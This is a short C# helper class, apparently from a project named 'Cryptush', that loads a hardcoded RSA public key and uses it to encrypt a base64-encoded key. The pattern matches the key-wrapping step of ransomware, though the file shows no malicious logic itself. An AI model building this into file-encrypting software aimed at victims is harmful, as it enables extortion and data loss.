using System;
using System.Security.Cryptography;

namespace Cryptush.lib
{
    class RSAHandler
    {
        public static string Enc(RSACryptoServiceProvider rsa, ref string key)
        {
            var protectedkey = rsa.Encrypt(Convert.FromBase64String(key), false);
            return Convert.ToBase64String(protectedkey);
        }
        public static RSACryptoServiceProvider Create()
        {
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048);
            rsa.FromXmlString(@"<RSAKeyValue><Modulus>nGrA6vQNPnUxwO2pEgpvi9brj9CahBrTMotQvjfxa27bajIFOm/xvmzUILHbavJhBcqr7YJ5CLIs2jtT0EAJGr5EWe5ddTK0jRojkZmeyXcyb9KV8EXIxuQGhYvmAlD4LEuWd5LeSFizC/MkWTXHTRgba552UvjAcmfA9tl1RIHiLgZS4Ihir1/2IlB2MrH3txlzbMoS4y4/57cFOjGWHN+HPEHFSEqFdCAe19iopDxwDgNph0KcLEyqh2eoElt1ozjWbjyw0SE7/67Bu8Qv6Zz4E0j3QTapi2vtqnPSikzzpmW5t6ET5HDcZygP/Gr3Sy0QE9fXXxRrMSeZMVD2aQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
            return rsa;
        }
    }
}
